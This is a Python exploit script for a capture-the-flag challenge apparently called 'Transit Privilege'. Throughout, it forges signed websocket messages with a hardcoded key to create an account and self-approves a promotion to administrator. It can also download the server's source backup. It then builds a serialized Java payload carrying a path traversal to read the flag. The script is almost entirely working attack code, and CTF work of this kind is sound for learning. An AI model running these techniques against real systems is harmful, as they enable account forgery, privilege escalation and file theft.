#!/usr/bin/env python3
import argparse
import asyncio
import hashlib
import hmac
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import time
import uuid
import zipfile
from pathlib import Path
from urllib.parse import urlparse

import requests
import websockets


KEY = b"6Ziy5ZCb5a2Q5LiN5aao5bCP5Lq6ISEh"
GHOST_CURSOR = "\u552e\u552e\u542f\u552e\u552e\u542f\u552e\u552e\u542f\u4e66\u516c\u5361\u5267"


def clear_proxy_env():
    for key in list(os.environ):
        if key.lower().endswith("proxy"):
            os.environ.pop(key, None)


def hmac_md5(text):
    return hmac.new(KEY, text.encode(), hashlib.md5).hexdigest()


def hmac_sha256(text):
    return hmac.new(KEY, text.encode(), hashlib.sha256).hexdigest()


def sha256(text):
    return hashlib.sha256(text.encode()).hexdigest()


def canonical_body(body):
    return json.dumps(body or {}, sort_keys=True, separators=(",", ":"), ensure_ascii=False)


def websocket_url(base):
    parsed = urlparse(base)
    scheme = "wss" if parsed.scheme == "https" else "ws"
    return f"{scheme}://{parsed.netloc}/proxy"


def route_id(route_epoch, profile, op):
    return int(sha256(f"{route_epoch}|{profile}|{op}")[:8], 16) & 0x7fffffff


def bridge_proof(op, nonce, route_epoch, profile, identity, principal, ticket):
    text = f"proof|{op}|{nonce}|{route_epoch}|{profile}|{identity}|{principal}|{ticket}"
    return hmac_sha256(text)[:24]


def random_password():
    return "Aa9" + uuid.uuid4().hex[:13]


def resolve_java_tool(name):
    tool = shutil.which(name)
    if tool:
        return tool
    raise RuntimeError(f"{name} not found in PATH")


async def create_operator(base, username, password):
    ws_url = websocket_url(base)
    async with websockets.connect(ws_url) as ws:
        await ws.send(json.dumps({"type": "HELLO"}))
        hello = json.loads(await ws.recv())
        if not hello.get("ok"):
            raise RuntimeError(f"HELLO failed: {hello}")

        nonce = hello["nonce"]
        profile = hello["profile"]
        route_epoch = hello["routeEpoch"]

        timestamp = int(time.time() * 1000)
        auth_canonical = f"identifier=Transit&authVersion=1&timestamp={timestamp}&nonce={nonce}"
        await ws.send(json.dumps({
            "type": "AUTH",
            "source": "Transit",
            "timestamp": timestamp,
            "signature": hmac_md5(auth_canonical),
        }, separators=(",", ":")))
        auth = json.loads(await ws.recv())
        if not auth.get("ok"):
            raise RuntimeError(f"AUTH failed: {auth}")

        await ws.send(json.dumps({
            "type": "DESCRIBE",
            "source": "Transit",
            "scope": "edge.capability",
        }, separators=(",", ":")))
        describe = json.loads(await ws.recv())
        if not describe.get("ok"):
            raise RuntimeError(f"DESCRIBE failed: {describe}")

        op = "cap.sync"
        route = route_id(route_epoch, profile, op)
        identity = "edge-" + uuid.uuid4().hex[:8]

        warmup = {
            "identity": identity,
            "principal": username,
            "secret": password,
        }
        warmup_hash = sha256(canonical_body(warmup))
        ts1 = timestamp + 1
        seq1 = 1
        call1 = (
            f"identifier=Transit&authVersion=2"
            f"&timestamp={ts1}"
            f"&nonce={nonce}"
            f"&seq={seq1}"
            f"&profile={profile}"
            f"&routeId={route}"
            f"&op={op}"
            f"&bodyHash={warmup_hash}"
        )
        await ws.send(json.dumps({
            "type": "CALL",
            "source": "Transit",
            "timestamp": ts1,
            "seq": seq1,
            "profile": profile,
            "routeId": route,
            "op": op,
            "body": warmup,
            "bodyHash": warmup_hash,
            "signature": hmac_md5(call1),
            "requestId": "exp-1",
        }, separators=(",", ":")))
        negotiate = json.loads(await ws.recv())
        if not negotiate.get("ok") or negotiate.get("state") != "proof_required":
            raise RuntimeError(f"cap.sync stage1 failed: {negotiate}")

        ticket = negotiate["ticket"]
        await ws.send(json.dumps({
            "type": "DESCRIBE",
            "source": "Transit",
            "scope": "edge.capability.ticket",
            "ticket": ticket,
        }, separators=(",", ":")))
        ticket_info = json.loads(await ws.recv())
        if not ticket_info.get("ok"):
            raise RuntimeError(f"ticket describe failed: {ticket_info}")

        final_body = {
            "identity": identity,
            "principal": username,
            "secret": password,
            "ticket": ticket,
            "proof": bridge_proof(op, nonce, route_epoch, profile, identity, username, ticket),
        }
        final_hash = sha256(canonical_body(final_body))
        ts2 = timestamp + 2
        seq2 = 2
        call2 = (
            f"identifier=Transit&authVersion=2"
            f"&timestamp={ts2}"
            f"&nonce={nonce}"
            f"&seq={seq2}"
            f"&profile={profile}"
            f"&routeId={route}"
            f"&op={op}"
            f"&bodyHash={final_hash}"
        )
        await ws.send(json.dumps({
            "type": "CALL",
            "source": "Transit",
            "timestamp": ts2,
            "seq": seq2,
            "profile": profile,
            "routeId": route,
            "op": op,
            "body": final_body,
            "bodyHash": final_hash,
            "signature": hmac_md5(call2),
            "requestId": "exp-2",
        }, separators=(",", ":")))
        linked = json.loads(await ws.recv())
        if not linked.get("ok"):
            raise RuntimeError(f"cap.sync stage2 failed: {linked}")
        return linked


def build_bundle(cursor, profile="merge"):
    java_code = r"""
package ctf.sctf.ops.maintenance;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.Base64;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class InventoryCursorEntry implements Serializable {
    private static final long serialVersionUID = 7319048271L;

    private String name;
    private String cursor;
    private String profile;
    private transient String state;

    public InventoryCursorEntry(String name, String cursor, String profile) {
        this.name = name;
        this.cursor = cursor;
        this.profile = profile;
    }

    public static void main(String[] args) throws Exception {
        String cursor = args.length == 0 ? "daily/edge-01.txt" : args[0];
        String profile = args.length > 1 ? args[1] : "merge";
        InventoryCursorEntry obj = new InventoryCursorEntry("daily-check", cursor, profile);

        ByteArrayOutputStream serialized = new ByteArrayOutputStream();
        try (ObjectOutputStream out = new ObjectOutputStream(serialized)) {
            out.writeObject(obj);
        }

        ByteArrayOutputStream archive = new ByteArrayOutputStream();
        try (ZipOutputStream zip = new ZipOutputStream(archive)) {
            zip.putNextEntry(new ZipEntry("manifest.json"));
            zip.write("{\"kind\":\"opsbak\",\"version\":2,\"profile\":\"nightly\"}".getBytes());
            zip.closeEntry();

            zip.putNextEntry(new ZipEntry("inventory.dat"));
            zip.write(serialized.toByteArray());
            zip.closeEntry();
        }

        System.out.println(Base64.getEncoder().encodeToString(archive.toByteArray()));
    }
}
""".strip() + "\n"

    javac = resolve_java_tool("javac")
    java = resolve_java_tool("java")

    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)
        src_dir = root / "ctf" / "sctf" / "ops" / "maintenance"
        src_dir.mkdir(parents=True)
        src = src_dir / "InventoryCursorEntry.java"
        src.write_text(java_code)
        subprocess.check_call([javac, "-d", str(root), str(src)])
        return subprocess.check_output(
            [java, "-cp", str(root), "ctf.sctf.ops.maintenance.InventoryCursorEntry", cursor, profile],
            text=True,
        ).strip()


def login(session, base, username, password):
    response = session.post(
        f"{base}/login",
        json={"username": username, "password": password},
        timeout=10,
    )
    response.raise_for_status()
    return response.json()


def promote_to_admin(session, base):
    bootstrap = session.get(f"{base}/api/workspace/bootstrap", timeout=10)
    bootstrap.raise_for_status()
    workflow = bootstrap.json()["workflow"]

    draft = session.post(
        f"{base}/api/workspace/action",
        json={
            "actionId": workflow["draftActionId"],
            "payload": {"kind": "ops", "reason": "daily support sync"},
        },
        timeout=10,
    )
    draft.raise_for_status()
    draft_ref = draft.json()["draftRef"]

    preview = session.post(
        f"{base}/api/workspace/action",
        json={
            "actionId": workflow["previewActionId"],
            "payload": {"draftRef": draft_ref},
        },
        timeout=10,
    )
    preview.raise_for_status()

    submit = session.post(
        f"{base}/api/workspace/action",
        json={
            "actionId": workflow["submitActionId"],
            "payload": {
                "draftRef": draft_ref,
                "policyRef": "desk-default",
                "routing": {
                    "mode": "retain",
                    "handoff": "owner",
                },
            },
        },
        timeout=10,
    )
    submit.raise_for_status()
    request_id = submit.json()["row"]["id"]

    advance = session.post(
        f"{base}/api/workspace/action",
        json={
            "actionId": workflow["advanceActionId"],
            "payload": {
                "id": request_id,
                "state": "APPROVED",
            },
        },
        timeout=10,
    )
    advance.raise_for_status()

    me = session.get(f"{base}/admin/me", timeout=10)
    me.raise_for_status()
    data = me.json()
    if data.get("role") != "ADMIN":
        raise RuntimeError(f"promotion failed: {data}")
    return {
        "workflow": workflow,
        "draftRef": draft_ref,
        "requestId": request_id,
        "me": data,
        "preview": preview.json(),
    }


def fetch_support_bundle(session, base, output_path):
    create = session.post(
        f"{base}/api/backup/create",
        json={"profile": "server-source"},
        timeout=10,
    )
    create.raise_for_status()
    ticket = create.json()["ticket"]

    fetch = session.get(
        f"{base}/api/backup/fetch",
        params={"ticket": ticket},
        timeout=30,
    )
    fetch.raise_for_status()
    Path(output_path).write_bytes(fetch.content)

    with zipfile.ZipFile(output_path) as archive:
        entries = archive.namelist()
    return {"ticket": ticket, "entries": entries}


def exploit_reconcile(session, base, bundle):
    response = session.post(
        f"{base}/admin/maintenance/reconcile",
        json={"bundle": bundle},
        timeout=20,
    )
    response.raise_for_status()
    import_id = response.json()["importId"]

    report = session.get(
        f"{base}/admin/maintenance/reports",
        params={"importId": import_id},
        timeout=10,
    )
    report.raise_for_status()
    body = report.text
    match = re.search(r"SCTF\{[^}]+\}", body)
    if not match:
        raise RuntimeError(f"flag not found in report: {body}")
    return import_id, match.group(0), body


def main():
    parser = argparse.ArgumentParser(description="Transit Privilege final exploit")
    parser.add_argument("base", help="target base url, e.g. http://127.0.0.1:5040")
    parser.add_argument(
        "--cursor",
        default=GHOST_CURSOR,
        help="serialized cursor payload, defaults to the ghost-bits path for ../../../flag",
    )
    parser.add_argument(
        "--save-source",
        metavar="PATH",
        help="optional path to save admin backup server-source.zip",
    )
    args = parser.parse_args()

    clear_proxy_env()
    base = args.base.rstrip("/")
    username = "u" + uuid.uuid4().hex[:10]
    password = random_password()

    session = requests.Session()
    session.trust_env = False

    print("[*] create operator via /proxy")
    linked = asyncio.run(create_operator(base, username, password))
    print(f"[+] linked principal: {linked['principal']}")

    print("[*] login")
    logged = login(session, base, username, password)
    print(f"[+] role: {logged['role']}")

    print("[*] promote to admin through workspace facade")
    promoted = promote_to_admin(session, base)
    print(f"[+] request id: {promoted['requestId']}")
    print(f"[+] current role: {promoted['me']['role']}")

    if args.save_source:
        print("[*] fetch admin support bundle")
        bundle = fetch_support_bundle(session, base, args.save_source)
        print(f"[+] backup ticket: {bundle['ticket']}")
        print(f"[+] bundle entries: {bundle['entries']}")
        print(f"[+] saved to: {args.save_source}")

    print("[*] build malicious maintenance bundle")
    blob = build_bundle(args.cursor)
    print(f"[+] bundle size: {len(blob)}")

    print("[*] trigger reconcile and read report")
    import_id, flag, report = exploit_reconcile(session, base, blob)
    print(f"[+] import id: {import_id}")
    print(report)
    print(f"[FLAG] {flag}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] aborted", file=sys.stderr)
        raise SystemExit(130)
